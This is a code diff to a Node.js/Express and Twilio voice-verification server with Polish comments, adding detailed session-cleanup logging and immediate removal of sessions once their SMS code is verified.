@@ -15,16 +15,32 @@ function cleanupOldSessions() {
   const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
   const initialLength = sessions.length;
   
+  // Log wszystkich sesji przed cleanup
+  console.log(`Cleanup: ${sessions.length} sessions before cleanup`);
+  sessions.forEach(s => {
+    console.log(`  - Session ${s.id}: ${s.phone}, status: ${s.status}, created: ${s.createdAt}`);
+  });
+  
   // Usuń sesje zweryfikowane oraz starsze niż 1 godzina
-  const filteredSessions = sessions.filter(session => 
-    session.status !== "verified" && session.createdAt > oneHourAgo
-  );
+  const filteredSessions = sessions.filter(session => {
+    if (session.status === "verified") {
+      console.log(`Cleanup: Removing verified session ${session.id} (${session.phone})`);
+      return false;
+    }
+    if (session.createdAt <= oneHourAgo) {
+      console.log(`Cleanup: Removing old session ${session.id} (${session.phone}) - created ${session.createdAt}`);
+      return false;
+    }
+    return true;
+  });
   
   sessions.length = 0;
   sessions.push(...filteredSessions);
   
   if (initialLength !== sessions.length) {
-    console.log(`Cleaned up ${initialLength - sessions.length} sessions (verified + old)`);
+    console.log(`Cleanup: Removed ${initialLength - sessions.length} sessions. ${sessions.length} sessions remaining`);
+  } else {
+    console.log(`Cleanup: No sessions removed. ${sessions.length} sessions remaining`);
   }
 }
 
@@ -123,6 +139,13 @@ app.post('/verify', parser.urlencoded({ extended: false }), async (req, res) => 
       twiml.say(twimlOptions, "Kod poprawny. Trwa finalizacja transakcji.")
       session.status = "verified"
       console.log("Session is verified", session.id)
+      
+      // Natychmiastowe usunięcie zweryfikowanej sesji
+      const sessionIndex = sessions.findIndex(s => s.id === session.id);
+      if (sessionIndex !== -1) {
+        sessions.splice(sessionIndex, 1);
+        console.log(`Session ${session.id} removed immediately after verification`);
+      }
     } else {
       twiml.say(twimlOptions, "Kod niepoprawny. Wpisz kod z SMS-a. W razie błędu zacznij od początku.")
       twiml.gather({
